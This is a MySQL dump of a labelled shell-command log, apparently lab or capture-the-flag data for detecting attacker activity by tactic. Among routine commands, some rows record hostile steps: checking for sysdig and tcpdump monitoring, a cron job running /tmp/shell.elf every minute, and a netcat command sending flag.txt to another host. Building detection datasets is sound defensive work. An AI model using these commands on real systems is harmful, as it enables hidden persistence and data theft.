
SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for s1_operation
-- ----------------------------
DROP TABLE IF EXISTS `s1_operation`;
CREATE TABLE `s1_operation`  (
  `command_id` bigint(0) NULL DEFAULT NULL,
  `user` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `remote_ip` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `tty` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `_raw` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `authority` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `command_keyword` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `parsed_args` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `input` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `output` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `target` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `command_type` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `is_sensitive` bigint(0) NULL DEFAULT NULL,
  `timestamp` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `host_ip` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  `label` bigint(0) NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of s1_operation
-- ----------------------------
INSERT INTO `s1_operation` VALUES (1, 'root', '', '/dev/pts/3', 'ps -ef |grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:11:51', '192.168.9.103', 0);
INSERT INTO `s1_operation` VALUES (2, 'ubuntu', '', '/dev/pts/3', 'sudo -i', 'user', 'sudo', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:11:02', '192.168.9.103', 0);
INSERT INTO `s1_operation` VALUES (3, 'root', '', '/dev/pts/3', 'ps -ef|grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:10:18', '192.168.9.104', 0);
INSERT INTO `s1_operation` VALUES (5, 'root', '', '/dev/pts/1', 'exit', 'root', 'exit', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:37:29', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (8, 'root', '', '/dev/pts/0', 'clear', 'root', 'clear', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:14:39', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (9, 'ubuntu', '', '/dev/pts/0', 'sudo -i', 'user', 'sudo', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:13:50', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (23, 'ubuntu', '', '/dev/pts/0', 'sudo -i', 'user', 'sudo', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:15:27', '192.168.9.105', 0);
INSERT INTO `s1_operation` VALUES (24, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:13:30', '192.168.9.102', 10);
INSERT INTO `s1_operation` VALUES (25, 'test', '', '/dev/pts/1', 'cat flag.txt', 'user', 'cat', '\"[]\"', '\"flag.txt\"', '\"stdout\"', '\"[]\"', '', 1, '2024-11-11 17:13:31', '192.168.9.102', 10);
INSERT INTO `s1_operation` VALUES (26, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:13:33', '192.168.9.102', 10);
INSERT INTO `s1_operation` VALUES (27, 'test', '', '/dev/pts/1', 'ftp 192.168.9.104', 'user', 'ftp', '\"[]\"', '\"None\"', '\"stdout\"', '\"[\'192.168.9.104\']\"', 'Exfiltration', 1, '2024-11-11 17:13:07', '192.168.9.102', 10);
INSERT INTO `s1_operation` VALUES (28, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:15', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (29, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:15', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (30, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:15', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (31, 'test', '', '/dev/pts/1', 'cd', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:15', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (32, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:13', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (33, 'test', '', '/dev/pts/1', 'cd /tmp', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:13', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (34, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:11', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (35, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:12:08', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (36, 'test', '', '/dev/pts/1', 'pwd', 'user', 'pwd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:11:43', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (37, 'test', '', '/dev/pts/1', 'cd /tmp', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:11:36', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (38, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:11:37', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (39, 'test', '', '/dev/pts/1', 'cd', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:11:41', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (40, 'test', '', '/dev/pts/1', 'pwd', 'user', 'pwd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:11:43', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (41, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:17', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (42, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:17', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (43, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:17', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (44, 'test', '', '/dev/pts/1', 'cd /tmp', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:17', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (45, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:11', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (46, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:11', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (47, 'test', '', '/dev/pts/1', 'cd', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:11', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (48, 'test', '', '/dev/pts/1', 'cd /tmp', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:07', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (49, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 17:09:07', '192.168.9.102', 0);
INSERT INTO `s1_operation` VALUES (50, 'test', '', '/dev/pts/1', 'lsb_release -a', 'user', 'lsb_release', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:52:38', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (51, 'test', '', '/dev/pts/1', 'lsb_release -a', 'user', 'lsb_release', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:52:38', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (52, 'test', '', '/dev/pts/1', 'uname -a', 'user', 'uname', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:52:16', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (53, 'test', '', '/dev/pts/1', 'cd', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:52:11', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (54, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:52:09', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (55, 'test', '', '/dev/pts/1', 'cd ..', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:52:08', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (56, 'test', '', '/dev/pts/1', 'cd /home/ubuntu/', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:55', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (57, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:55', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (58, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:40', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (59, 'test', '', '/dev/pts/1', 'ls -a', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:04', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (60, 'test', '', '/dev/pts/1', 'ls -a', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:04', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (61, 'test', '', '/dev/pts/1', 'cd', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:02', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (62, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:51:03', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (63, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:50:55', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (64, 'test', '', '/dev/pts/1', 'cd /home/ubuntu/', 'user', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:50:54', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (65, 'test', '', '/dev/pts/1', 'ls /home', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:50:46', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (66, 'test', '', '/dev/pts/1', 'netstat -tunlp', 'user', 'netstat', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Discovery', 1, '2024-11-11 16:50:38', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (67, 'test', '', '/dev/pts/1', 'pwd', 'user', 'pwd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:50:32', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (68, 'test', '', '/dev/pts/1', 'whoami', 'user', 'whoami', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:50:27', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (69, 'test', '', '/dev/pts/1', 'ls', 'user', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:50:29', '192.168.9.102', 9);
INSERT INTO `s1_operation` VALUES (70, 'root', '', '/dev/pts/0', 'crontab -l', 'root', 'crontab', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Persistence', 1, '2024-11-11 16:36:17', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (71, 'root', '', '/dev/pts/0', 'crontab /tmp/cron', 'root', 'crontab', '\"[]\"', '\"/tmp/cron\"', '\"stdout\"', '\"[]\"', 'Persistence', 1, '2024-11-11 16:36:13', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (72, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:35:58', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (73, 'root', '', '/dev/pts/0', 'echo \"* * * * * /tmp/shell.elf\" > /tmp/cron', 'root', 'echo', '\"[]\"', '\"\"* * * * * /tmp/shell.elf\"\"', '\"/tmp/cron\"', '\"[]\"', '', 1, '2024-11-11 16:35:57', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (74, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:35:14', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (75, 'root', '', '/dev/pts/0', 'chmod +x shell.elf', 'root', 'chmod', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:35:14', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (76, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:34:43', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (77, 'root', '', '/dev/pts/0', 'cd /tmp', 'root', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:34:42', '192.168.9.105', 6);
INSERT INTO `s1_operation` VALUES (78, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:32:07', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (79, 'root', '', '/dev/pts/0', 'ping 192.168.9.103', 'root', 'ping', '\"[]\"', '\"None\"', '\"stdout\"', '\"[\'192.168.9.103\']\"', 'Discovery', 1, '2024-11-11 16:32:03', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (80, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:55', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (81, 'root', '', '/dev/pts/0', 'cat default', 'root', 'cat', '\"[]\"', '\"default\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:46', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (82, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:44', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (83, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:41', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (84, 'root', '', '/dev/pts/0', 'cd sites-enabled/', 'root', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:44', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (85, 'root', '', '/dev/pts/0', 'cat nginx.conf', 'root', 'cat', '\"[]\"', '\"nginx.conf\"', '\"stdout\"', '\"[]\"', '', 1, '2024-11-11 16:31:36', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (86, 'root', '', '/dev/pts/0', 'cd /etc/nginx', 'root', 'cd', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:29', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (87, 'root', '', '/dev/pts/0', 'ls', 'root', 'ls', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:31:30', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (88, 'root', '', '/dev/pts/0', 'ifconfig', 'root', 'ifconfig', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Discovery', 1, '2024-11-11 16:31:22', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (89, 'root', '', '/dev/pts/0', 'ps -ef |grep tcpdump', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:15:41', '192.168.9.105', 0);
INSERT INTO `s1_operation` VALUES (90, 'root', '', '/dev/pts/0', 'whoami', 'root', 'whoami', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:31:19', '192.168.9.105', 5);
INSERT INTO `s1_operation` VALUES (91, 'ubuntu', '', '/dev/pts/0', 'sudo -i', 'user', 'sudo', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:15:27', '192.168.9.105', 0);
INSERT INTO `s1_operation` VALUES (92, 'root', '', '/dev/pts/0', 'ps -ef |grep tcpdump', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:15:41', '192.168.9.105', 0);
INSERT INTO `s1_operation` VALUES (93, 'root', '', '/dev/pts/0', 'ps -ef |grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:15:37', '192.168.9.105', 0);
INSERT INTO `s1_operation` VALUES (94, 'root', '', '/dev/pts/0', 'exit', 'root', 'exit', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:15:29', '192.168.9.105', 0);
INSERT INTO `s1_operation` VALUES (95, 'ubuntu', '', '/dev/pts/0', 'sudo -i', 'user', 'sudo', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:13:50', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (96, 'root', '', '/dev/pts/0', 'clear', 'root', 'clear', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', '', 0, '2024-11-11 16:14:39', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (97, 'root', '', '/dev/pts/0', 'ps -ef |grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:14:23', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (98, 'root', '', '/dev/pts/0', 'ps -ef |grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:14:23', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (99, 'root', '', '/dev/pts/0', 'ps -ef |grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:14:23', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (100, 'root', '', '/dev/pts/0', 'ps -ef |grep tcpdump', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:14:19', '192.168.9.101', 0);
INSERT INTO `s1_operation` VALUES (101, 'root', '', '/dev/pts/3', 'ps -ef |grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:11:51', '192.168.9.103', 0);
INSERT INTO `s1_operation` VALUES (102, 'ubuntu', '', '/dev/pts/3', 'sudo -i', 'user', 'sudo', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Privilege_Escalation', 1, '2024-11-11 16:11:02', '192.168.9.103', 0);
INSERT INTO `s1_operation` VALUES (103, 'root', '', '/dev/pts/3', 'ps -ef |grep tcpdump', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:11:47', '192.168.9.103', 0);
INSERT INTO `s1_operation` VALUES (104, 'root', '', '/dev/pts/3', 'ps -ef|grep sysdig', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:10:18', '192.168.9.104', 0);
INSERT INTO `s1_operation` VALUES (105, 'root', '', '/dev/pts/3', 'ps -ef|grep tcpdump', 'root', 'ps', '\"[]\"', '\"None\"', '\"stdout\"', '\"[]\"', 'Collection', 1, '2024-11-11 16:10:09', '192.168.9.104', 0);
INSERT INTO `s1_operation` VALUES (129, 'test', NULL, '/dev/pts/1', 'nc 192.168.9.105 6666 < flag.txt', 'user', 'nc', '\"[(1, \'192.168.9.105\'),(2, \'flag.txt\')]\"', '\"flag.txt\"', '\"stdout\"', '\"[\'192.168.9.105\']\"', 'Exfiltration', 1, '2024-11-11 17:14:13', '192.168.9.102', 10);

SET FOREIGN_KEY_CHECKS = 1;
